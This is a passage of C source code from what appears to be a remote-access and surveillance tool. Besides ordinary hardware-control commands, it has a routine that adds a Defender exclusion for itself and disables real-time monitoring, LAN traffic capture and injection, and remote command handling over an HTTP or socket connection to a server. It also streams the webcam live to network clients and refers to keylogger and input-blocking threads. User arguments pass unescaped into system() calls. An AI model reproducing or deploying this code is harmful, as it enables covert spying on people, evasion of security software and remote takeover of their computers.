                    "<keyMaterial>%s</keyMaterial>"
                    "</sharedKey>"
                    "</security>"
                    "</MSM>"
                    "</WLANProfile>", 
                    args[1], args[1], args[2]);
            
            mbstowcs(profileXml, profileXmlA, sizeof(profileXml));
            
            dwResult = WlanSetProfile(hClient, NULL, 0, profileXml, NULL, TRUE, NULL, NULL);
            if (dwResult != ERROR_SUCCESS) {
                printf("Failed to set profile\n");
                free(ssid);
                WlanCloseHandle(hClient, NULL);
                return;
            }
        }
        
        dwResult = WlanConnect(hClient, NULL, &wlanConnParam, NULL);
        if (dwResult == ERROR_SUCCESS) {
            printf("Connecting to %S...\n", ssid);
        } else {
            printf("Failed to connect to network\n");
        }
        
        free(ssid);
    }
    else if (strcmp(args[0], "disconnect") == 0) {
        dwResult = WlanDisconnect(hClient, NULL, NULL);
        if (dwResult == ERROR_SUCCESS) {
            printf("Disconnected from current network\n");
        } else {
            printf("Failed to disconnect\n");
        }
    }
    else if (strcmp(args[0], "info") == 0) {
        PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
        dwResult = WlanEnumInterfaces(hClient, NULL, &pIfList);
        
        if (dwResult == ERROR_SUCCESS && pIfList->dwNumberOfItems > 0) {
            PWLAN_INTERFACE_INFO pIfInfo = &pIfList->InterfaceInfo[0];
            
            PWLAN_CONNECTION_ATTRIBUTES pConnAttributes = NULL;
            DWORD dwConnAttributesSize = sizeof(WLAN_CONNECTION_ATTRIBUTES);
            
            dwResult = WlanQueryInterface(hClient, &pIfInfo->InterfaceGuid, 
                                         wlan_intf_opcode_current_connection, 
                                         NULL, &dwConnAttributesSize, 
                                         (PVOID*)&pConnAttributes, NULL);
            
            if (dwResult == ERROR_SUCCESS) {
                printf("Current Connection:\n");
                printf("SSID: %S\n", pConnAttributes->wlanAssociationAttributes.dot11Ssid.ucSSID);
                printf("State: %d\n", pConnAttributes->isState);
                
                if (pConnAttributes) {
                    WlanFreeMemory(pConnAttributes);
                }
            }
        }
        
        if (pIfList) {
            WlanFreeMemory(pIfList);
        }
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
    
    WlanCloseHandle(hClient, NULL);
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "scan") == 0) {
        printf("Scanning for wireless networks...\n");
        snprintf(cmd, sizeof(cmd), "iwlist scan | grep ESSID");
        system(cmd);
    }
    else if (strcmp(args[0], "connect") == 0) {
        if (args[1] == NULL) {
            printf("Usage: wlan connect <ssid> [password]\n");
            return;
        }
        
        if (args[2]) {
            snprintf(cmd, sizeof(cmd), "nmcli dev wifi connect '%s' password '%s'", args[1], args[2]);
        } else {
            snprintf(cmd, sizeof(cmd), "nmcli dev wifi connect '%s'", args[1]);
        }
        
        system(cmd);
    }
    else if (strcmp(args[0], "disconnect") == 0) {
        snprintf(cmd, sizeof(cmd), "nmcli dev disconnect");
        system(cmd);
    }
    else if (strcmp(args[0], "info") == 0) {
        snprintf(cmd, sizeof(cmd), "iwconfig");
        system(cmd);
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
#endif
}

// Fan Control
void fan_control(char **args) {
    printf("\n[Fan Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: fanctl <on|off|speed> [value]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Turning fans on\n");
        printf("Windows fan control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning fans off\n");
        printf("Windows fan control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "speed") == 0) {
        if (args[1] == NULL) {
            printf("Usage: fanctl speed <value (0-100)>\n");
            return;
        }
        
        int speed = atoi(args[1]);
        if (speed < 0) speed = 0;
        if (speed > 100) speed = 100;
        
        printf("Setting fan speed to %d%%\n", speed);
        printf("Windows fan control requires vendor-specific APIs\n");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Turning fans on\n");
        snprintf(cmd, sizeof(cmd), "echo 1 > /sys/class/hwmon/hwmon*/pwm*_enable");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning fans off\n");
        snprintf(cmd, sizeof(cmd), "echo 0 > /sys/class/hwmon/hwmon*/pwm*_enable");
        system(cmd);
    }
    else if (strcmp(args[0], "speed") == 0) {
        if (args[1] == NULL) {
            printf("Usage: fanctl speed <value (0-255)>\n");
            return;
        }
        
        int speed = atoi(args[1]);
        if (speed < 0) speed = 0;
        if (speed > 255) speed = 255;
        
        printf("Setting fan speed to %d\n", speed);
        snprintf(cmd, sizeof(cmd), "echo %d > /sys/class/hwmon/hwmon*/pwm*", speed);
        system(cmd);
    }
#endif
}

// LAN Interception
void lan_intercept(char **args) {
    printf("\n[LAN Traffic Interception]\n");
    
    if (args[0] == NULL) {
        printf("Usage: lanintercept <start|stop|inject> [parameters]\n");
        return;
    }
    
    if (strcmp(args[0], "start") == 0) {
        printf("Starting LAN traffic interception...\n");
        
#ifdef _WIN32
        printf("Windows LAN interception requires WinPcap or Npcap\n");
        printf("Consider using: npcap - https://nmap.org/npcap/\n");
#else
        printf("Starting packet capture on all interfaces...\n");
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i any -w %s/captures/lan_capture.pcap", output_dir);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "stop") == 0) {
        printf("Stopping LAN traffic interception...\n");
        
#ifdef _WIN32
        printf("Stopping packet capture...\n");
#else
        system("pkill -f tcpdump");
#endif
    }
    else if (strcmp(args[0], "inject") == 0) {
        if (args[1] == NULL || args[2] == NULL) {
            printf("Usage: lanintercept inject <interface> <packet_data>\n");
            return;
        }
        
        printf("Injecting packet on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows packet injection requires WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo sendip -p ipv4 -p tcp -d %s %s", args[2], args[1]);
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Unhook Defender
void unhook_defender(char **args) {
    printf("\n[Windows Defender Unhook]\n");
    
#ifdef _WIN32
    BOOL isAdmin = FALSE;
    HANDLE token = NULL;
    
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        
        CloseHandle(token);
    }
    
    if (!isAdmin) {
        printf("Error: This command requires administrator privileges\n");
        return;
    }
    
    char path[MAX_PATH_LENGTH];
    GetModuleFileName(NULL, path, MAX_PATH_LENGTH);
    
    char cmd[MAX_COMMAND_LENGTH];
    snprintf(cmd, sizeof(cmd), "powershell -Command \"Add-MpPreference -ExclusionPath '%s'\"", path);
    system(cmd);
    
    snprintf(cmd, sizeof(cmd), "powershell -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
    system(cmd);
    
    printf("Windows Defender unhooked and exception added for this process\n");
    printf("Real-time monitoring temporarily disabled\n");
#else
    printf("This command is only available on Windows\n");
#endif
}

// Hardware Information
void hardware_info(char **args) {
    printf("\n[Detailed Hardware Information]\n");
    char output[4096];
    
#ifdef _WIN32
    printf("\nCPU Details:\n");
    execute_command("wmic cpu get name,manufacturer,maxclockspeed,numberofcores,numberoflogicalprocessors,processortype", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMemory Details:\n");
    execute_command("wmic memorychip get banklabel,capacity,manufacturer,partnumber,speed,serialnumber", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nDisk Details:\n");
    execute_command("wmic diskdrive get model,firmwarerevision,serialnumber,size,interfacetype", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nGPU Details:\n");
    execute_command("wmic path win32_VideoController get name,adapterram,driverversion", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMotherboard Details:\n");
    execute_command("wmic baseboard get manufacturer,product,serialnumber", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nBIOS Details:\n");
    execute_command("wmic bios get manufacturer,serialnumber,version,releaseDate", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nNetwork Adapters:\n");
    execute_command("wmic nic get name,macaddress,netconnectionid,netenabled", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUSB Devices:\n");
    execute_command("wmic path win32_usbcontrollerdevice get dependent", output, sizeof(output));
    printf("%s\n", output);
#else
    printf("\nCPU Details:\n");
    execute_command("cat /proc/cpuinfo | grep -E 'model name|processor|cpu MHz|cache size'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMemory Details:\n");
    execute_command("sudo dmidecode --type memory | grep -E 'Size|Type|Speed|Manufacturer|Serial Number'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nDisk Details:\n");
    execute_command("sudo hdparm -I /dev/sda | grep -E 'Model Number|Serial Number|Firmware Revision'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nGPU Details:\n");
    execute_command("lspci -vnn | grep -i VGA -A 12", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nMotherboard Details:\n");
    execute_command("sudo dmidecode --type baseboard | grep -E 'Manufacturer|Product Name|Serial Number'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nBIOS Details:\n");
    execute_command("sudo dmidecode --type bios | grep -E 'Vendor|Version|Release Date'", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nNetwork Adapters:\n");
    execute_command("lspci -vnn | grep -i ethernet -A 8", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUSB Devices:\n");
    execute_command("lsusb -v", output, sizeof(output));
    printf("%s\n", output);
#endif
}

// LED Control
void led_control(char **args) {
    printf("\n[LED Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: ledctl <on|off|blink|color> [parameters]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Turning LEDs on\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning LEDs off\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "blink") == 0) {
        printf("Blinking LEDs\n");
        printf("Windows LED control requires vendor-specific APIs\n");
    }
    else if (strcmp(args[0], "color") == 0) {
        if (args[1] == NULL) {
            printf("Usage: ledctl color <RRGGBB>\n");
            return;
        }
        
        printf("Setting LED color to %s\n", args[1]);
        printf("Windows LED control requires vendor-specific APIs\n");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Turning LEDs on\n");
        snprintf(cmd, sizeof(cmd), "echo 1 > /sys/class/leds/*/brightness");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Turning LEDs off\n");
        snprintf(cmd, sizeof(cmd), "echo 0 > /sys/class/leds/*/brightness");
        system(cmd);
    }
    else if (strcmp(args[0], "blink") == 0) {
        printf("Blinking LEDs\n");
        snprintf(cmd, sizeof(cmd), "echo timer > /sys/class/leds/*/trigger");
        system(cmd);
    }
    else if (strcmp(args[0], "color") == 0) {
        if (args[1] == NULL) {
            printf("Usage: ledctl color <RRGGBB>\n");
            return;
        }
        
        printf("Setting LED color to %s\n", args[1]);
        printf("RGB LED control requires specific hardware interfaces\n");
    }
#endif
}

// Beeper Control
void beeper_control(char **args) {
    printf("\n[System Beeper Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: beeper <on|off|beep> [frequency] [duration]\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "on") == 0) {
        printf("Enabling system beeper\n");
        printf("Windows beeper control requires specific APIs\n");
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Disabling system beeper\n");
        printf("Windows beeper control requires specific APIs\n");
    }
    else if (strcmp(args[0], "beep") == 0) {
        int frequency = 1000;
        int duration = 500;
        
        if (args[1]) frequency = atoi(args[1]);
        if (args[2]) duration = atoi(args[2]);
        
        printf("Beeping at %dHz for %dms\n", frequency, duration);
        Beep(frequency, duration);
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "on") == 0) {
        printf("Enabling system beeper\n");
        snprintf(cmd, sizeof(cmd), "sudo modprobe pcspkr");
        system(cmd);
    }
    else if (strcmp(args[0], "off") == 0) {
        printf("Disabling system beeper\n");
        snprintf(cmd, sizeof(cmd), "sudo rmmod pcspkr");
        system(cmd);
    }
    else if (strcmp(args[0], "beep") == 0) {
        int frequency = 1000;
        int duration = 500;
        
        if (args[1]) frequency = atoi(args[1]);
        if (args[2]) duration = atoi(args[2]);
        
        printf("Beeping at %dHz for %dms\n", frequency, duration);
        snprintf(cmd, sizeof(cmd), "beep -f %d -l %d", frequency, duration);
        system(cmd);
    }
#endif
}

// USB Dump
void usb_dump(char **args) {
    printf("\n[USB Traffic Monitoring]\n");
    
    if (args[0] == NULL) {
        printf("Usage: usbdump <start|stop>\n");
        return;
    }
    
    if (strcmp(args[0], "start") == 0) {
        printf("Starting USB traffic monitoring...\n");
        
#ifdef _WIN32
        printf("Windows USB monitoring requires USBPcap or Wireshark with USB support\n");
        printf("Consider using: USBPcap - https://desowin.org/usbpcap/\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo usbmon -t -w %s/captures/usb_capture.pcap", output_dir);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "stop") == 0) {
        printf("Stopping USB traffic monitoring...\n");
        
#ifdef _WIN32
        printf("Stopping USB capture...\n");
#else
        system("pkill -f usbmon");
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Raw Socket
void raw_socket(char **args) {
    printf("\n[Raw Socket Operations]\n");
    
    if (args[0] == NULL) {
        printf("Usage: rawsock <send|listen> [parameters]\n");
        return;
    }
    
    if (strcmp(args[0], "send") == 0) {
        if (args[1] == NULL || args[2] == NULL) {
            printf("Usage: rawsock send <interface> <packet_data>\n");
            return;
        }
        
        printf("Sending raw packet on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows raw socket operations require WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo sendip -p ipv4 -p tcp -d %s -i %s", args[2], args[1]);
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "listen") == 0) {
        if (args[1] == NULL) {
            printf("Usage: rawsock listen <interface>\n");
            return;
        }
        
        printf("Listening for raw packets on interface %s...\n", args[1]);
        
#ifdef _WIN32
        printf("Windows raw socket listening requires WinPcap or Npcap\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "sudo tcpdump -i %s -w %s/captures/raw_capture.pcap", args[1], output_dir);
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Power Control
void power_control(char **args) {
    printf("\n[Power Management Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: power <sleep|hibernate|shutdown|reboot>\n");
        return;
    }
    
#ifdef _WIN32
    if (strcmp(args[0], "sleep") == 0) {
        printf("Putting system to sleep...\n");
        SetSuspendState(FALSE, FALSE, FALSE);
    }
    else if (strcmp(args[0], "hibernate") == 0) {
        printf("Hibernating system...\n");
        SetSuspendState(TRUE, FALSE, FALSE);
    }
    else if (strcmp(args[0], "shutdown") == 0) {
        printf("Shutting down system...\n");
        system("shutdown /s /t 0");
    }
    else if (strcmp(args[0], "reboot") == 0) {
        printf("Rebooting system...\n");
        system("shutdown /r /t 0");
    }
#else
    char cmd[MAX_COMMAND_LENGTH];
    
    if (strcmp(args[0], "sleep") == 0) {
        printf("Putting system to sleep...\n");
        snprintf(cmd, sizeof(cmd), "systemctl suspend");
        system(cmd);
    }
    else if (strcmp(args[0], "hibernate") == 0) {
        printf("Hibernating system...\n");
        snprintf(cmd, sizeof(cmd), "systemctl hibernate");
        system(cmd);
    }
    else if (strcmp(args[0], "shutdown") == 0) {
        printf("Shutting down system...\n");
        snprintf(cmd, sizeof(cmd), "shutdown -h now");
        system(cmd);
    }
    else if (strcmp(args[0], "reboot") == 0) {
        printf("Rebooting system...\n");
        snprintf(cmd, sizeof(cmd), "reboot");
        system(cmd);
    }
#endif
}

// Thermal Control
void thermal_control(char **args) {
    printf("\n[Thermal Management Control]\n");
    
    if (args[0] == NULL) {
        printf("Usage: thermal <info|throttle|cool>\n");
        return;
    }
    
    if (strcmp(args[0], "info") == 0) {
        printf("Retrieving thermal information...\n");
        
#ifdef _WIN32
        char output[4096];
        execute_command("wmic /namespace:\\\\root\\wmi PATH MSAcpi_ThermalZoneTemperature get CurrentTemperature", output, sizeof(output));
        printf("Temperature: %s\n", output);
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "cat /sys/class/thermal/thermal_zone*/temp");
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "throttle") == 0) {
        printf("Throttling CPU to reduce temperature...\n");
        
#ifdef _WIN32
        printf("Windows thermal throttling requires powercfg or vendor-specific tools\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "echo -n 1 | sudo tee /sys/class/thermal/cooling_device*/cur_state");
        system(cmd);
#endif
    }
    else if (strcmp(args[0], "cool") == 0) {
        printf("Activating cooling mechanisms...\n");
        
#ifdef _WIN32
        printf("Windows cooling control requires vendor-specific tools\n");
#else
        char cmd[MAX_COMMAND_LENGTH];
        snprintf(cmd, sizeof(cmd), "echo -n 0 | sudo tee /sys/class/thermal/cooling_device*/cur_state");
        system(cmd);
#endif
    }
    else {
        printf("Unknown command: %s\n", args[0]);
    }
}

// Find Admin Processes
void find_admin_processes(char **args) {
    printf("\n[Admin Process Detection]\n");
    
#ifdef _WIN32
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        printf("Failed to create process snapshot\n");
        return;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        printf("Failed to get first process\n");
        return;
    }
    
    printf("Processes running as administrator:\n");
    
    do {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            HANDLE hToken;
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                TOKEN_ELEVATION elevation;
                DWORD size = sizeof(TOKEN_ELEVATION);
                if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
                    if (elevation.TokenIsElevated) {
                        printf("- %s (PID: %d)\n", pe32.szExeFile, pe32.th32ProcessID);
                    }
                }
                CloseHandle(hToken);
            }
            CloseHandle(hProcess);
        }
    } while (Process32Next(hProcessSnap, &pe32));
    
    CloseHandle(hProcessSnap);
#else
    printf("Processes running as root:\n");
    
    DIR *dir;
    struct dirent *entry;
    
    if ((dir = opendir("/proc")) == NULL) {
        printf("Failed to open /proc directory\n");
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        char *endptr;
        long pid = strtol(entry->d_name, &endptr, 10);
        if (*endptr != '\0') continue;
        
        char path[256];
        snprintf(path, sizeof(path), "/proc/%ld/status", pid);
        
        FILE *fp = fopen(path, "r");
        if (fp == NULL) continue;
        
        char line[256];
        int uid = 0;
        
        while (fgets(line, sizeof(line), fp)) {
            if (strncmp(line, "Uid:", 4) == 0) {
                sscanf(line + 4, "%d", &uid);
                break;
            }
        }
        
        fclose(fp);
        
        if (uid == 0) {
            snprintf(path, sizeof(path), "/proc/%ld/comm", pid);
            fp = fopen(path, "r");
            if (fp) {
                char name[256] = "";
                if (fgets(name, sizeof(name), fp)) {
                    name[strcspn(name, "\n")] = '\0';
                    printf("- %s (PID: %ld)\n", name, pid);
                }
                fclose(fp);
            }
        }
    }
    
    closedir(dir);
#endif
}

// Connect to server command
void connect_to_server(char **args) {
    if (connected_to_server) {
        printf("Already connected to server\n");
        return;
    }
    
    // Check if we should use socket connection
    if (strcmp(server_url, "EMPTY") == 0) {
        use_socket_connection = 1;
        
        if (connect_to_remote_server_socket()) {
            // Start file monitoring when connected
            file_monitoring_active = 1;
            pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
            
            // Start handling remote commands in a separate thread
            #ifdef _WIN32
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_remote_commands_socket, NULL, 0, NULL);
            #else
                pthread_t thread;
                pthread_create(&thread, NULL, (void *(*)(void *))handle_remote_commands_socket, NULL);
                pthread_detach(thread);
            #endif
            
            printf("Connected to socket server at %s:%d\n", socket_host, socket_port);
        } else {
            printf("Failed to connect to socket server\n");
        }
    } else {
        use_socket_connection = 0;
        
        if (args[0] != NULL) {
            strncpy(server_url, args[0], sizeof(server_url) - 1);
        }
        
        if (connect_to_remote_server()) {
            // Start file monitoring when connected
            file_monitoring_active = 1;
            pthread_create(&file_monitor_thread, NULL, monitor_output_directory, NULL);
            
            // Start handling remote commands in a separate thread
            #ifdef _WIN32
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)handle_remote_commands, NULL, 0, NULL);
            #else
                pthread_t thread;
                pthread_create(&thread, NULL, (void *(*)(void *))handle_remote_commands, NULL);
                pthread_detach(thread);
            #endif
            
            printf("Connected to HTTP server at %s\n", server_url);
        } else {
            printf("Failed to connect to HTTP server\n");
        }
    }
}

// Disconnect from server command
void disconnect_from_server(char **args) {
    if (!connected_to_server) {
        printf("Not connected to server\n");
        return;
    }
    
    connected_to_server = 0;
    
    // Stop file monitoring
    file_monitoring_active = 0;
    pthread_join(file_monitor_thread, NULL);
    
    printf("Disconnected from server\n");
}

// Set server URL command
void set_server_url(char **args) {
    if (args[0] == NULL) {
        printf("Usage: serverurl <url>\n");
        printf("Special value: \"EMPTY\" to use socket connection\n");
        return;
    }
    
    strncpy(server_url, args[0], sizeof(server_url) - 1);
    
    // Check if we should use socket connection
    if (strcmp(server_url, "EMPTY") == 0) {
        use_socket_connection = 1;
        printf("Server URL set to use socket connection\n");
        printf("Socket host: %s, port: %d\n", socket_host, socket_port);
    } else {
        use_socket_connection = 0;
        printf("Server URL set to %s\n", server_url);
    }
}

// Startup programs
void startup_programs(char **args) {
    printf("\n[Startup Programs]\n");
    char output[4096];
    
#ifdef _WIN32
    printf("\nCurrent User Startup:\n");
    execute_command("dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nAll Users Startup:\n");
    execute_command("dir \"%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nRegistry Startup:\n");
    execute_command("reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", output, sizeof(output));
    printf("%s\n", output);
    execute_command("reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nScheduled Tasks:\n");
    execute_command("schtasks /query /fo LIST", output, sizeof(output));
    printf("%s\n", output);
#else
    printf("\nCron jobs:\n");
    execute_command("crontab -l", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nSystemd services:\n");
    execute_command("systemctl list-unit-files --type=service | grep enabled", output, sizeof(output));
    printf("%s\n", output);
    
    printf("\nUser autostart entries:\n");
    execute_command("ls -la ~/.config/autostart", output, sizeof(output));
    printf("%s\n", output);
#endif
}

// Exit tool
void exit_tool(char **args) {
    printf("\nExiting...\n");
    realtime_monitoring = 0;
    keylogger_active = 0;
    input_blocked = 0;
    file_monitoring_active = 0;
    streaming_active = 0;
    
    if (monitor_thread) {
        pthread_join(monitor_thread, NULL);
    }
    if (keylogger_thread) {
        pthread_join(keylogger_thread, NULL);
    }
    if (file_monitor_thread) {
        pthread_join(file_monitor_thread, NULL);
    }
    if (stream_thread) {
        pthread_join(stream_thread, NULL);
    }
    
    connected_to_server = 0;
    
    #ifdef _WIN32
        CoUninitialize();
    #endif
    
    #ifndef _WIN32
        cleanup_http();
    #endif
    
    exit(0);
}

// ==================== VIDEO STREAMING FUNCTIONS ====================

static int send_all(socket_t fd, const void *buf, size_t len) {
    size_t total = 0;
    const char *p = (const char*)buf;
    while (total < len) {
        int sent = (int)send(fd, p + total, (int)(len - total), 0);
        if (sent <= 0) {
#ifdef _WIN32
            int err = WSAGetLastError();
            (void)err;
#else
            int err = errno;
            (void)err;
#endif
            return -1;
        }
        total += (size_t)sent;
    }
    return 0;
}

void cleanup_video() {
    streaming_active = 0;
    
#ifndef _WIN32
    if (video_fd >= 0) {
        enum v4l2_buf_type type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        ioctl(video_fd, VIDIOC_STREAMOFF, &type);
        for (int i = 0; i < n_buffers; ++i) {
            if (buffers && buffers[i].start && buffers[i].length > 0) {
                munmap(buffers[i].start, buffers[i].length);
            }
        }
        free(buffers);
        buffers = NULL;
        n_buffers = 0;
        close(video_fd);
        video_fd = -1;
    }
#endif

    if (stream_server_fd != INVALID_FD) {
        close(stream_server_fd);
        stream_server_fd = INVALID_FD;
    }
}

#ifdef _WIN32
BOOL WINAPI console_handler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        cleanup_video();
        ExitProcess(0);
    }
    return TRUE;
}
#else
void handle_sigint(int sig) {
    (void)sig;
    cleanup_video();
    exit(0);
}
#endif

int send_frame(socket_t client_fd, const void *data, size_t length) {
    char header[128];
    int header_len = snprintf(header, sizeof(header),
                              "--frame\r\n"
                              "Content-Type: image/jpeg\r\n"
                              "Content-Length: %zu\r\n\r\n",
                              length);
    if (header_len < 0 || header_len >= (int)sizeof(header)) header_len = (int)sizeof(header) - 1;

    if (send_all(client_fd, header, (size_t)header_len) < 0) return -1;
    if (send_all(client_fd, data, length) < 0) return -1;
    if (send_all(client_fd, "\r\n", 2) < 0) return -1;
    return 0;
}

#ifdef _WIN32
unsigned __stdcall client_thread(void* arg) {
#else
void* client_thread(void* arg) {
#endif
    socket_t client_fd = *(socket_t*)arg;
    free(arg);
    arg = NULL;

    const char *hdr =
        "HTTP/1.0 200 OK\r\n"
        "Server: C MJPEG Server\r\n"
        "Cache-Control: no-cache\r\n"
        "Pragma: no-cache\r\n"
        "Connection: close\r\n"
        "Content-Type: multipart/x-mixed-replace; boundary=frame\r\n\r\n";

    if (send_all(client_fd, hdr, strlen(hdr)) < 0) {
        close(client_fd);
#ifdef _WIN32
        return 0;
#else
        return NULL;
#endif
    }

#ifdef _WIN32
    unsigned char dummy_jpg[] = {
        0xFF,0xD8,0xFF,0xD9 // minimal JPEG (empty)
    };
    while (streaming_active) {
        if (send_frame(client_fd, dummy_jpg, sizeof(dummy_jpg)) < 0) break;
        usleep(FRAME_DELAY);
    }
#else
    struct v4l2_buffer buf;
    memset(&buf, 0, sizeof(buf));

    while (streaming_active) {
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;

        if (ioctl(video_fd, VIDIOC_DQBUF, &buf) < 0) {
            if (errno == EAGAIN || errno == EIO) {
                usleep(1000);
                continue;
            } else {
                perror("VIDIOC_DQBUF");
                break;
            }
        }

        size_t bytes = (buf.bytesused > 0 ? (size_t)buf.bytesused : buffers[buf.index].length);

        if (send_frame(client_fd, buffers[buf.index].start, bytes) < 0) {
            if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
                perror("VIDIOC_QBUF after send failure");
            }
            break;
        }

        if (ioctl(video_fd, VIDIOC_QBUF, &buf) < 0) {
            perror("VIDIOC_QBUF");
            break;
        }

        usleep(FRAME_DELAY);
    }
#endif

    close(client_fd);
#ifdef _WIN32
    return 0;
#else
    return NULL;
#endif
}

int init_video() {
#ifndef _WIN32
    struct v4l2_format fmt;
    struct v4l2_requestbuffers req;
    struct v4l2_buffer buf;

    video_fd = open(VIDEO_DEVICE, O_RDWR | O_NONBLOCK);
    if (video_fd < 0) {
        perror("open video device");
        return 0;
    }

    memset(&fmt, 0, sizeof(fmt));
    fmt.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    fmt.fmt.pix.width = WIDTH;
    fmt.fmt.pix.height = HEIGHT;
    fmt.fmt.pix.pixelformat = V4L2_PIX_FMT_MJPEG;
    fmt.fmt.pix.field = V4L2_FIELD_ANY;

    if (ioctl(video_fd, VIDIOC_S_FMT, &fmt) < 0) {
        perror("VIDIOC_S_FMT");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    memset(&req, 0, sizeof(req));
    req.count = 4;
    req.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
    req.memory = V4L2_MEMORY_MMAP;

    if (ioctl(video_fd, VIDIOC_REQBUFS, &req) < 0) {
        perror("VIDIOC_REQBUFS");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    if (req.count < 2) {
        fprintf(stderr, "Insufficient buffer memory\n");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    buffers = calloc(req.count, sizeof(*buffers));
    if (!buffers) {
        perror("calloc buffers");
        close(video_fd);
        video_fd = -1;
        return 0;
    }

    for (n_buffers = 0; n_buffers < req.count; ++n_buffers) {
        memset(&buf, 0, sizeof(buf));
        buf.type = V4L2_BUF_TYPE_VIDEO_CAPTURE;
        buf.memory = V4L2_MEMORY_MMAP;
        buf.index = n_buffers;

        if (ioctl(video_fd, VIDIOC_QUERYBUF, &buf) < 0) {
